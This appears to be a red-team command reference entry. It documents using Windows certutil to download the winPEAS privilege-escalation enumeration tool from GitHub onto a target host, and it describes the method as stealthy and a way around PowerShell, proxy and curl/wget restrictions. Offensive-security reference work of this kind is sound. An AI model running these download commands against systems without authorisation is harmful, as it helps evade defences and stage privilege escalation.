---
id: fa48b57a-9708-4e9f-91f9-30784dcec9e9
type: command
executor: command_prompt
data: >-
  certutil -urlcache -split -f
  https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
  winPEAS.exe
output: 'CertUtil: -URLcache command completed successfully.'
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - download
  - enumeration
verified: true
validated: true
---

# winpeas-download-with-certutil

## Command

```command_prompt
certutil -urlcache -split -f $_URL $_OUTPUT_FILE
```

## Description

Downloads the winPEAS executable from the official GitHub releases using the built-in Windows certutil utility. This method is stealthy and useful in environments where PowerShell is restricted, web proxies block direct downloads, or external tools like curl/wget are unavailable. It fetches the latest x64 version and saves it locally for subsequent privilege escalation enumeration on a target Windows host.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_URL | Full URL to the winPEAS executable (e.g., GitHub release link for x64 or x86 version) | Yes |
| $_OUTPUT_FILE | Local filename to save the downloaded file (e.g., winPEAS.exe) | Yes |
| -urlcache | Enables downloading and caching of the URL content | Built-in |
| -split | Automatically splits large files during download to handle size limits | Built-in |
| -f | Forces the download, overwriting any existing cache or file | Built-in |

## Examples

### Basic Usage

Download the latest x64 winPEAS executable:

```command_prompt
certutil -urlcache -split -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe winPEAS.exe
```

### Advanced Usage

For 32-bit systems, use the x86 URL:

```command_prompt
certutil -urlcache -split -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx86.exe winPEAS.exe
```

To download the .bat version:

```command_prompt
certutil -urlcache -split -f https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat winPEAS.bat
```

## Expected Output

```
CertUtil: -URLcache command completed successfully.
```

The file (e.g., winPEAS.exe) is now available in the current directory. Verify the download by checking the file size (approximately 2-5 MB for .exe) and optionally compute its hash to match the GitHub release checksum for integrity.

## Related

- [[tools/winPEAS]]
- [[procedures/Enumerate-Windows-for-Privilege-Escalation-with-winPEAS]]
